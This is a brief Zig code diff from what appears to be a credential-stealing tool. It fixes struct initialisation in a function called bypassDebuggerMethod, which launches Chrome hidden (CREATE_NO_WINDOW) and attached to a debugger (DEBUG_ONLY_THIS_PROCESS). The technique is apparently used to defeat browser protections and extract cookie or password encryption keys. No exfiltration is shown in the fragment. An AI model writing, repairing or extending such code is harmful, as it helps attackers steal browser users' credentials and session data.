@@ -304,10 +304,9 @@ pub fn bypassDebuggerMethod(browser: []const u8) BypassResult {
     for (exe_name_buf[0..E.chrome_exe.len], 0..) |c, i| exe_us[i] = c;
     exe_us[E.chrome_exe.len] = 0;
 
-    var si: [68]u8 = undefined;
-    @memset(&si, 0);
-    var pi: [24]u8 = undefined;
-    @memset(&pi, 0);
+    var si = std.mem.zeroes(types.STARTUPINFOW);
+    si.cb = @sizeOf(types.STARTUPINFOW);
+    var pi = std.mem.zeroes(types.PROCESS_INFORMATION);
 
     const ok = CreateProcessW(null, exe_us[0..E.chrome_exe.len+1:0], null, null, 0, DEBUG_ONLY_THIS_PROCESS | CREATE_NO_WINDOW, null, null, @ptrCast(&si), @ptrCast(&pi));
     if (ok == 0) return result;
